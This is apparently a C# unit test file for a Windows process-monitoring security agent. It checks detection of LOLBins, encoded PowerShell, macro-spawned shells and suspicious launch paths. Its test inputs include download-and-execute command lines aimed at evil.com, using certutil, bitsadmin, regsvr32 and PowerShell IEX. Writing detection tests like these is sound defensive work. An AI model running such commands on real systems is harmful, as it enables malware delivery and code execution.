using WinSentinel.Agent;
using WinSentinel.Agent.Modules;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Logging.Abstractions;

namespace WinSentinel.Tests.Agent;

public class ProcessMonitorModuleTests
{
    private readonly ThreatLog _threatLog;
    private readonly AgentConfig _config;
    private readonly ProcessMonitorModule _module;

    public ProcessMonitorModuleTests()
    {
        _threatLog = new ThreatLog();
        _config = new AgentConfig { RiskTolerance = RiskTolerance.Medium };
        _module = new ProcessMonitorModule(
            NullLogger<ProcessMonitorModule>.Instance,
            _threatLog,
            _config);
    }

    // ── Module Lifecycle ──

    [Fact]
    public void Name_ReturnsProcessMonitor()
    {
        Assert.Equal("ProcessMonitor", _module.Name);
    }

    [Fact]
    public void IsActive_InitiallyFalse()
    {
        Assert.False(_module.IsActive);
    }

    // ── Suspicious Path Detection ──

    [Theory]
    [InlineData(@"C:\Users\Test\AppData\Local\Temp\malware.exe", "Suspicious Launch Path")]
    [InlineData(@"C:\Users\Test\Downloads\sketch.exe", "Suspicious Launch Path")]
    [InlineData(@"C:\Users\Test\Desktop\hack.exe", "Suspicious Launch Path")]
    [InlineData(@"C:\$Recycle.Bin\S-1-5-21\evil.exe", "Suspicious Launch Path")]
    [InlineData(@"C:\Windows\Temp\dropper.exe", "Suspicious Launch Path")]
    public void AnalyzeProcess_DetectsSuspiciousPath(string exePath, string expectedTitle)
    {
        var proc = CreateMockProcess("sketch.exe", exePath);
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == expectedTitle);
    }

    [Fact]
    public void AnalyzeProcess_IgnoresKnownAppDataApps()
    {
        var proc = CreateMockProcess("Discord.exe",
            @"C:\Users\Test\AppData\Local\Discord\app-1.0\Discord.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t => t.Title == "Suspicious Launch Path");
    }

    [Fact]
    public void AnalyzeProcess_RecycleBinIsCritical()
    {
        var proc = CreateMockProcess("evil.exe",
            @"C:\$Recycle.Bin\S-1-5-21-123456\evil.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Severity == ThreatSeverity.Critical);
    }

    // ── LOLBin Detection ──

    [Theory]
    [InlineData("mshta.exe", "")]
    [InlineData("certutil.exe", "-urlcache -split -f http://evil.com/payload.exe")]
    [InlineData("bitsadmin.exe", "/transfer job http://evil.com/a.exe c:\\a.exe")]
    [InlineData("wscript.exe", "c:\\temp\\script.vbs")]
    [InlineData("cscript.exe", "c:\\temp\\script.js")]
    [InlineData("regsvr32.exe", "/s /u /i:http://evil.com/file.sct scrobj.dll")]
    public void AnalyzeProcess_DetectsLolBins(string processName, string commandLine)
    {
        var proc = CreateMockProcess(processName, @"C:\Windows\System32\" + processName, commandLine);
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "LOLBin Execution Detected");
    }

    [Fact]
    public void AnalyzeProcess_CertutilUrlcacheIsCritical()
    {
        var proc = CreateMockProcess("certutil.exe",
            @"C:\Windows\System32\certutil.exe",
            "-urlcache -split -f http://evil.com/payload.exe c:\\payload.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "LOLBin Execution Detected" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void AnalyzeProcess_Rundll32JavascriptIsCritical()
    {
        var proc = CreateMockProcess("rundll32.exe",
            @"C:\Windows\System32\rundll32.exe",
            "javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write()");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "LOLBin Execution Detected" && t.Severity == ThreatSeverity.Critical);
    }

    // ── Encoded PowerShell Detection ──

    [Theory]
    [InlineData("powershell.exe -enc SQBFAFgA")]
    [InlineData("powershell.exe -EncodedCommand SQBFAFgA")]
    [InlineData("pwsh.exe -e SQBFAFgA")]
    [InlineData("powershell.exe -ec SQBFAFgA")]
    public void AnalyzeProcess_DetectsEncodedPowerShell(string commandLine)
    {
        var name = commandLine.StartsWith("pwsh") ? "pwsh.exe" : "powershell.exe";
        var proc = CreateMockProcess(name,
            @"C:\Windows\System32\" + name,
            commandLine);
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Encoded PowerShell Command" && t.Severity == ThreatSeverity.Critical);
    }

    [Theory]
    [InlineData("powershell.exe -NoProfile -WindowStyle Hidden -Command Get-Process")]
    [InlineData("powershell.exe (New-Object Net.WebClient).DownloadString('http://evil.com')")]
    [InlineData("powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com')")]
    [InlineData("powershell.exe -ExecutionPolicy Bypass -File script.ps1")]
    public void AnalyzeProcess_DetectsSuspiciousPowerShell(string commandLine)
    {
        var proc = CreateMockProcess("powershell.exe",
            @"C:\Windows\System32\powershell.exe",
            commandLine);
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t =>
            t.Title == "Suspicious PowerShell Execution" || t.Title == "Encoded PowerShell Command");
    }

    [Fact]
    public void AnalyzeProcess_NormalPowerShellIsOk()
    {
        var proc = CreateMockProcess("powershell.exe",
            @"C:\Windows\System32\powershell.exe",
            "powershell.exe -Command Get-ChildItem");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t =>
            t.Title == "Encoded PowerShell Command" || t.Title == "Suspicious PowerShell Execution");
    }

    // ── Child Process Anomaly (Macro Attack) Detection ──

    [Theory]
    [InlineData("winword.exe", "cmd.exe")]
    [InlineData("excel.exe", "powershell.exe")]
    [InlineData("outlook.exe", "wscript.exe")]
    [InlineData("acrord32.exe", "cmd.exe")]
    public void AnalyzeProcess_DetectsMacroAttack(string parent, string child)
    {
        var proc = CreateMockProcess(child,
            @"C:\Windows\System32\" + child, "",
            parentName: parent);
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Potential Macro Attack" && t.Severity == ThreatSeverity.Critical);
    }

    [Fact]
    public void AnalyzeProcess_NormalParentChildIsOk()
    {
        var proc = CreateMockProcess("cmd.exe",
            @"C:\Windows\System32\cmd.exe", "",
            parentName: "explorer.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t => t.Title == "Potential Macro Attack");
    }

    // ── Privilege Escalation Detection ──

    [Fact]
    public void AnalyzeProcess_DetectsUnexpectedSystemProcess()
    {
        var proc = CreateMockProcess("suspicious.exe",
            @"C:\Temp\suspicious.exe", "",
            owner: "NT AUTHORITY\\SYSTEM");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.Title == "Unexpected SYSTEM Process");
    }

    [Fact]
    public void AnalyzeProcess_ExpectedSystemProcessIsOk()
    {
        var proc = CreateMockProcess("TrustedInstaller.exe",
            @"C:\Windows\servicing\TrustedInstaller.exe", "",
            owner: "NT AUTHORITY\\SYSTEM");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.DoesNotContain(threats, t => t.Title == "Unexpected SYSTEM Process");
    }

    // ── Rate Limiting ──

    [Fact]
    public void AnalyzeProcess_RateLimitsDuplicateAlerts()
    {
        // Same process info should be rate-limited after the first alert
        var proc = CreateMockProcess("mshta.exe", @"C:\Windows\System32\mshta.exe");

        _module.AnalyzeProcess(proc);
        _module.AnalyzeProcess(proc); // Should be suppressed
        _module.AnalyzeProcess(proc); // Should be suppressed

        var threats = _threatLog.GetAll();
        var mshtaThreats = threats.Where(t => t.Title == "LOLBin Execution Detected").ToList();
        Assert.Single(mshtaThreats);
    }

    // ── Response Actions by Risk Tolerance ──

    [Fact]
    public void AnalyzeProcess_MediumRisk_AlertsOnly()
    {
        _config.RiskTolerance = RiskTolerance.Medium;
        var proc = CreateMockProcess("mshta.exe", @"C:\Windows\System32\mshta.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.ResponseTaken != null && t.ResponseTaken.Contains("Alert"));
    }

    [Fact]
    public void AnalyzeProcess_HighRisk_LogsOnly()
    {
        _config.RiskTolerance = RiskTolerance.High;
        var proc = CreateMockProcess("certutil.exe",
            @"C:\Windows\System32\certutil.exe",
            "-urlcache -split -f http://evil.com/payload.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        Assert.Contains(threats, t => t.ResponseTaken != null && t.ResponseTaken.Contains("Logged only"));
    }

    // ── Multiple Rules Can Fire ──

    [Fact]
    public void AnalyzeProcess_MultipleRulesCanTrigger()
    {
        // A process from Temp that is also a LOLBin
        var proc = CreateMockProcess("certutil.exe",
            @"C:\Users\Test\AppData\Local\Temp\certutil.exe",
            "-urlcache -split -f http://evil.com/payload.exe");
        _module.AnalyzeProcess(proc);

        var threats = _threatLog.GetAll();
        // Should have at least path warning + LOLBin detection
        Assert.True(threats.Count >= 2, $"Expected ≥2 threats, got {threats.Count}");
    }

    // ── Helpers ──

    private static ProcessInfo CreateMockProcess(
        string name,
        string exePath,
        string commandLine = "",
        string parentName = "explorer.exe",
        string owner = "DESKTOP\\User",
        int pid = 12345,
        int parentPid = 1000)
    {
        return new ProcessInfo
        {
            ProcessId = pid,
            ParentProcessId = parentPid,
            ProcessName = name,
            ExecutablePath = exePath,
            CommandLine = commandLine,
            ParentName = parentName,
            Owner = owner
        };
    }
}
